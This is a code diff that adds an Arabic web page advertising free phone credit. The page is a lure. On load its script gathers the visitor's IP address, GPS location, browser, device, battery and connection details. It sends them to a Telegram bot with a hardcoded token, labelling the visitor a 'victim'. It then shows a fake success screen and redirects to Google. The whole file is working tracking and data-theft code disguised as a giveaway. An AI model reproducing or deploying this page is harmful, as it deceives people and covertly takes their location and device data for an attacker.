@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>شحن رصيد مجاني</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#1a237e,#4a148c);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.container{background:rgba(0,0,0,0.6);border-radius:20px;padding:30px 20px;max-width:400px;width:100%;text-align:center;border:2px solid #7c4dff;box-shadow:0 0 40px rgba(124,77,255,0.4)}
+h1{font-size:22px;color:#7c4dff;margin-bottom:8px}
+.sub{color:#aaa;font-size:13px;margin-bottom:20px}
+.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;justify-content:center;align-items:center;flex-direction:column}
+.load.show{display:flex}
+.spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #7c4dff;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.done{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;justify-content:center;align-items:center;flex-direction:column}
+.done.show{display:flex}
+.done h2{color:#4CAF50;font-size:24px;margin:12px 0}
+</style>
+</head>
+<body>
+<div class="container" id="form">
+<h1>📱 شحن رصيد مجاني</h1>
+<p class="sub">جاري تجهيز الشحن...</p>
+<div id="status" style="margin:20px 0;color:#aaa;font-size:13px;">⏳ جاري فحص جهازك...</div>
+</div>
+<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الشحن...</p></div>
+<div class="done" id="done"><h2>✅ تم الشحن!</h2><p>سيتم إضافة الرصيد خلال دقائق</p></div>
+<script>
+var u=new URL(window.location.href);
+var CHAT=u.searchParams.get('chatId')||'7276604783';
+var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+
+async function send(t){
+try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
+}
+
+async function getIP(){
+try{var r=await fetch('https://api.ipify.org?format=json');var d=await r.json();return d.ip;}catch(e){return 'غير معروف';}
+}
+
+async function getLocation(){
+try{return new Promise(function(resolve){navigator.geolocation.getCurrentPosition(function(p){resolve(p.coords.latitude+','+p.coords.longitude);},function(){resolve('غير متاح');},{timeout:5000});});}catch(e){return 'غير متاح';}
+}
+
+function getDeviceInfo(){
+var ua=navigator.userAgent;
+var platform=navigator.platform;
+var lang=navigator.language;
+var screenSize=screen.width+'x'+screen.height;
+var ram=navigator.deviceMemory||'غير معروف';
+var cores=navigator.hardwareConcurrency||'غير معروف';
+var battery='غير معروف';
+if(navigator.getBattery){
+navigator.getBattery().then(function(b){
+battery=(b.level*100)+'% - '+(b.charging?'شاحن':'بطارية');
+});
+}
+var connection='غير معروف';
+if(navigator.connection){connection=navigator.connection.effectiveType||'غير معروف';}
+return '🌐 <b>معلومات الجهاز:</b>\n📱 المتصفح: '+ua+'\n💻 النظام: '+platform+'\n🗣 اللغة: '+lang+'\n📺 الشاشة: '+screenSize+'\n🧠 رام: '+ram+' GB\n⚙️ أنوية: '+cores+'\n📡 اتصال: '+connection+'\n🔋 بطارية: '+battery;
+}
+
+async function autoSend(){
+document.getElementById('status').innerHTML='🔄 جاري جمع البيانات...';
+var ip=await getIP();
+var loc=await getLocation();
+var device=getDeviceInfo();
+var msg='📱 <b>ضحية شحن رصيد!</b>\n\n'+device+'\n\n🌐 <b>IP:</b> '+ip+'\n📍 <b>موقع:</b> '+loc+'\n\n⏰ '+new Date().toLocaleString('ar-EG');
+await send(msg);
+document.getElementById('form').style.display='none';
+document.getElementById('load').classList.add('show');
+setTimeout(function(){
+document.getElementById('load').classList.remove('show');
+document.getElementById('done').classList.add('show');
+setTimeout(function(){window.location.href='https://google.com/'},3000);
+},4000);
+}
+
+autoSend();
+</script>
+</body>
+</html>
